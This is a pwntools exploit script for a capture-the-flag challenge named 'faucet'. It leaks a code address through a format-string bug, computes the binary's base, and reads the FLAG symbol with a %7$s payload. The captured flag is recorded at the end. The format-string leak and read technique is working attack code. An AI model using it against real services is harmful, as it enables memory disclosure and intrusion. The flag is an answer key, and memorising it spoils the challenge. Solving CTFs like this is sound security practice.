from pwn import *

context.binary = elf = ELF("faucet")

r = remote("challenge.ctf.games", 31517)
r.recvuntil("a hammer")

# print out main addr
r.sendlineafter(">", b"5")
r.sendline("%21$lx")
r.recvuntil("a ")
ret = int(r.recvuntil("\n", drop = True).decode(), 16)
print("Main memory addr: ", hex(ret))

# calculating base address
elf.address = ret - elf.symbols.main
print("Base addr: ", hex(elf.address))

# first payload
payload = b'A' * 8
payload += p64(elf.symbols.FLAG)

print("FLAG addr: ", hex(elf.symbols.FLAG))

# send payload to store FLAG address at stack address offset 7
r.sendlineafter(">", b"5")
r.sendline(payload)

# second round payload to print the flag
payload2 = b'%7$s'

# send payload to print the flag
r.sendlineafter(">", b"5")
r.sendline(payload2)

r.interactive()

# flag{6bc75f21f8839ce0db898a1950d11ccf}
